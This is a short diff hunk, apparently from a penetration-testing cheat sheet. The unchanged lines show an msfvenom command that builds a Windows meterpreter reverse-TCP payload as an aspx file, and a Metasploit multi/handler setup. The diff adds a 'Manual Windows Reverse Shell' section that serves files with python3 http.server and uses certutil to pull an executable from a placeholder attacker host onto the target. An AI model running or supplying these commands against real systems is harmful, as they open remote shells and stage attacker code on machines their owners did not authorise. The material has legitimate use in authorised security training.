@@ -6,6 +6,13 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4567 -f aspx > l
 use exploit/multi/handler
 
 set payload windows/meterpreter/reverse_tcp
+
+```
+# Manual Windows Reverse Shell
+```
+python3 -m http.server
+
+certutil --urlcache -f http://YOUR_IP:PORT/filename.exe renamed.exe
 ```
 # Metasploit Windows suggester
 ```
